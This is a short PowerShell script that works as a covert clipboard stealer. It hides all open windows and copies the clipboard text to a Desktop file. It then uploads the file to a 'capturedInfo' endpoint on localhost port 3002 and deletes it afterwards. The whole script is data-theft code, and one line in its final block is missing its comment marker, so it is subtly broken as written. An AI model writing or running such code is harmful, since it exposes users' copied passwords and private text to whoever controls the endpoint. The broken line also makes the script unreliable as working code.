# Hide all windows
$null = (New-Object -ComObject Shell.Application).MinimizeAll()

# Define the remote URL
$remoteURL = "http://localhost:3002/capturedInfo"

# Create a WebClient object
$webClient = New-Object System.Net.WebClient

# Load the PresentationCore assembly
Add-Type -AssemblyName PresentationCore

# Check if clipboard contains text data
if ([System.Windows.Clipboard]::ContainsText()) {
    # Get the text from the clipboard
    $text = [System.Windows.Clipboard]::GetText()

    # Define a path to save the text
    $textPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::Desktop), "clipboard.txt")

    # Append the text to a file
    $text | Out-File -Append -FilePath $textPath
    Write-Host "Text appended to $textPath"
}

# Send the file to the remote URL

try {
    $response = $webClient.UploadFile($remoteURL, $textPath)
    $responseString = [System.Text.Encoding]::UTF8.GetString($response)
    Write-Host "File uploaded successfully: $textPath"
    Write-Host "Server Response:"
    Write-Host $responseString
} catch {
    Write-Host "Error uploading file $textPath : $_"
} finally {
    Delete the file after upload
    Remove-Item -Path $textPath -Force
    Write-Host "File deleted: $textPath"
}

exit